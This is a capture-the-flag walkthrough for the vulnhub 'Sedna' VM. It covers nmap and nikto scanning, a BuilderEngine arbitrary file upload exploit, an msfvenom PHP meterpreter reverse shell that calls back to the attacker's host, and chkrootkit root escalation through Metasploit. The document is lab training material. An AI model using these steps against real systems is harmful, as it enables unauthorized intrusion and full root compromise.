@@ -1,0 +1,61 @@
+
+Hack the Sedna VM (CTF Challenge)
+
+Today we are going to solve another vunhub’s lab challenges “SEDNA” which contains 4 flags on this machine One for a shell, One for root access and Two for doing post exploitation on Sedna. For doing practice you can download it from here.
+Let’s start!!!
+Scan particular IP with version scan using Nmap tool as given in the image.
+nmap -sV 192.168.0.113
+Here it point up the open ports and running services on it. As shown port 22, 53, 80 and etc. are open.
+
+Since port 80 is open therefore let explore target IP: 192.168.0.113 on the browser. From screenshot you can see I have not got any significant thing from here.
+
+Shortly I had used nikto for entire scan and here you can see it has revealed license.txt from the highlighted text in the given screenshot.
+
+Again I move towards browser to look at license.txt here I found the name of software “BUILDERENGINE” which might be used in this machine.
+
+Then I enrolled into Google in hope to seek any exploit related to this software.
+Luckily! the first link of the web page took me in the right direction here I found builder “engine 3.5.0 arbitrary file upload Exploit DB”.
+
+When you will open this link you’ll notice an html code as shown in the given below screenshot. Copy this html code (<html>….. </html>) and past it inside a text file.
+
+Now inside your text file replace localhost from target IP http:// 192.168.0.113 and save with .html extension, I have saved it as file.html.
+
+Above html code will create a form for file uploading; now use msfvenom to generate malicious PHP script and type following command.
+msfvenom –p php/meterpreter/reverse_tcp lhost=192.168.0.104 lport=4444 –f raw
+From screenshot you can read the generated PHP script, at this instant we need to copy the text from *<?php……….die()inside the text document then save it with .php extension, here I have saved it with shell.php after that load metasploit framework and start multi/handler for reverse connection.
+
+Next I will upload my shell.php file on target machine and to perform this we need to open file.html file where it will permit you to browse shell.php after that once you have select your file for uploading click on send button.
+
+Great!!! Our backdoor has uploaded successfully and from next screenshot you can observe I have obtained the path where my shell.php has been uploaded.
+
+Now let’s dig up above highlighted path in the browser 192.168.0.113/file; so here again you can observe shell.php under index of files. When you will click on shell.php file you will get meterpreter session at the background of metasploit framework.
+
+NICE!!! We have got victim’s meterpreter session; now time to capture the flags.
+
+Meterpreter> cd/var/www
+Meterpreter>ls
+Meterpreter>cat flag.txt
+Here we have got 1st flag successfully!
+
+Now turn into another directory to find our next flag.
+Meterpreter>cd/etc
+Meterpreter> cd chkrootkit
+Meterpreter>ls
+Meterpreter>cat README
+Under README file I came to know its version i.e. chkrootkit V.0.49
+
+When I investigate more related to this then I found an exploit inside the metasploit.
+Chkrootkit before 0.50 will run any executable file named /tmp/update as root, allowing a trivial privilege escalation. WfsDelay is set to 24h, since this is how often a chkrootkit scan is scheduled by default.
+Use exploit/unix/local/chkrootkit
+Msf exploit (chkrootkit)>options 
+Msf exploit (chkrootkit)>set session1
+Msf exploit (chkrootkit)>exploit
+
+Here we have got command shell session victim with root privilege
+Msf exploit (chkrootkit)>set session –I 2
+ls
+Cat flag.txt
+Awesome!!!  We have captured 2nd flag also.
+Now try to find out flag 3rd and 4th yourself to complete this task. GOOD LUCK!!!
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
